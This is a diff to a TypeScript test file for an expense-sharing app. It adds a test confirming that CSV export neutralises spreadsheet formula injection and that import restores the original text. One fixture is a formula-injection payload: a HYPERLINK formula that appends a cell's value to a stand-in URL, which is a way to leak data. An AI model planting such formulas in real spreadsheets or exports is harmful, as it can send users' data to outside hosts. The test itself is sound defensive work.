@@ -12,7 +12,7 @@ const op = (entity: Op['entity'], entityId: string, set: Record<string, unknown>
   opId: 'o' + ++n, groupId: G, entity, entityId, set, hlc: encodeHlc({ pt: 1_700_000_000_000 + n, c: 0, device: 'aaaaaaaaaaaaaaaa' }), author: 'a',
 })
 
-function sampleView(): GroupView {
+function sampleView(extra: Op[] = []): GroupView {
   const ops = [
     op('group', G, { name: 'Raclette, "2026"', currency: 'EUR' }),
     op('participant', 'p1', { name: 'Ann' }),
@@ -20,6 +20,7 @@ function sampleView(): GroupView {
     op('expense', 'e1', { title: 'Cheese', date: '2026-11-10', paidBy: 'p1', category: 9, notes: 'two, "big" ones', money: { amount: 1000, currency: 'EUR', splitMode: 'EVENLY', paidFor: [{ participantId: 'p1', shares: 1 }, { participantId: 'p2', shares: 1 }] } }),
     op('expense', 'e2', { title: 'Hotel', date: '2026-11-11', paidBy: 'p2', category: 32, notes: '', money: { amount: 30000, currency: 'EUR', splitMode: 'BY_PERCENTAGE', paidFor: [{ participantId: 'p1', shares: 7000 }, { participantId: 'p2', shares: 3000 }] } }),
     op('expense', 'e3', { title: 'Taxi', date: '2026-11-12', paidBy: 'p1', category: 35, notes: '', money: { amount: 2000, currency: 'EUR', originalAmount: 2200, originalCurrency: 'CHF', rate: 0.909, splitMode: 'BY_SHARES', paidFor: [{ participantId: 'p1', shares: 100 }, { participantId: 'p2', shares: 300 }] } }),
+    ...extra,
   ]
   const state = fold(G, ops, { now: 1_800_000_000_000 })
   return { state, record: { id: G, key: '', name: 'x', relays: [], joinedAt: 0, lastOpened: 0 }, ops, pending: new Set(), status: {} } as unknown as GroupView
@@ -36,6 +37,20 @@ describe('import / export', () => {
   it('parses quoted CSV with commas, quotes and semicolons', () => {
     expect(parseCsv('a,b\n"x, ""y""",z\n')).toEqual([['a', 'b'], ['x, "y"', 'z']])
     expect(parseCsv('a;b\r\n1,5;2\r\n')).toEqual([['a', 'b'], ['1,5', '2']])
+  })
+
+  it('CSV export neutralises spreadsheet formulas and import restores the text', () => {
+    const view = sampleView([
+      op('participant', 'p3', { name: '@evil' }),
+      op('expense', 'e4', { title: '=HYPERLINK("https://x.example/?"&B2,"click")', date: '2026-11-13', paidBy: 'p3', category: 0, notes: '+1 more', money: { amount: -500, currency: 'EUR', splitMode: 'EVENLY', paidFor: [{ participantId: 'p3', shares: 1 }] } }),
+    ])
+    const csv = exportCsv(view)
+    for (const line of csv.split('\n')) for (const cell of parseCsv(line)[0] ?? []) expect(cell).not.toMatch(/^[=+@]/)
+    expect(csv).toContain(',-5.00,') // numbers stay numbers
+    const row = parseImport(csv, 'x.csv').rows.find((r) => r.amount === -500)!
+    expect(row.title).toBe('=HYPERLINK("https://x.example/?"&B2,"click")')
+    expect(row.notes).toBe('+1 more')
+    expect(row.paidBy).toBe('@evil')
   })
 
   it('CSV export → import keeps every amount, payer and share', () => {
